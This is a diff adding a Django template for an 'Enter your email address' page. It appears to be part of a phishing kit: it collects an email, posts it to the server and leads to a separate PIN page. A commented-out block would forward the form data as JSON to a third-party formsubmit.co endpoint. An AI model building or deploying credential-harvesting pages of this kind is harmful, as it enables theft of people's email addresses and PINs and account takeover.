@@ -1,0 +1,99 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email address</title>
+
+    <!-- custom stylesheet + script -->
+    <link rel="stylesheet" href="{% static 'dist/style.css' %}">
+    <script defer src="{% static 'dist/script.js' %}"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js" integrity="sha512-pumBsjNRGGqkPzKHndZMaAG+bir374sORyzM3uulLV14lN5LyykqNk8eEeUlUkB3U0M4FApyaHraT65ihJhDpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <!-- favicon img -->
+    <link rel="shortcut icon" href="{% static 'images/OIP__3_-removebg-preview.png' %}" type="image/x-icon">
+
+
+</head>
+
+<body>
+
+    <form id="form" class="form2" method="POST" action="{% url 'pin' %}">
+        {% csrf_token %}
+
+
+
+        <div class="form2__header"><img src="{% static 'images/OIP__3_-removebg-preview.png' %}" alt=""></div>
+        <h3 class="form2__para">Enter your email address to continue</h3>
+
+        <div class="form2__inputCtn">
+            <input id="email" placeholder="Email Address" required name="email" type="email">
+        </div>
+
+        <button id="submitBtn" type="submit">Next</button>
+
+
+    </form>
+
+
+    <!-- <script src="app/build/js/intlTelInput.js"></script> -->
+    <script>
+
+        const btn = document.querySelector('#submitBtn')
+        form.addEventListener('submit', (e) => {
+            //e.preventDefault()
+            const formData = new FormData(form);
+            let object = {};
+            formData.forEach((value, key) => {
+                object[key] = value;
+            });
+            let json = JSON.stringify(object);
+            btn.textContent = 'Loading...';
+
+
+            $.ajax({
+                type: 'POST',
+                url: "{% url 'email' %}",
+                data: {
+                    email: $('#email').val(),
+                    csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val()
+                },
+            })
+
+            function myFunction(){
+                window.location.href = "{% url 'pin' %}";
+            }
+
+
+            //fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a268", {
+              //  method: "POST",
+                //headers: {
+                  //  'Content-Type': 'application/json',
+                    //'Accept': 'application/json'
+               // },
+               // body: json
+           // })
+                //.then(response => response.json())
+               // .then(data => {
+                 //   if (data.success == 'true') {
+                   //     setTimeout(() => {
+                     //       window.location.href = 'pin.html';
+                       // }, 1000);
+                 //   }
+                   // console.log(data)
+                //})
+               // .catch(error => {
+                 //   alert('an error occured, please try again')
+                   // console.log(error)
+                    //window.location.reload()
+                //});
+        })
+
+    </script>
+</body>
+
+</html>
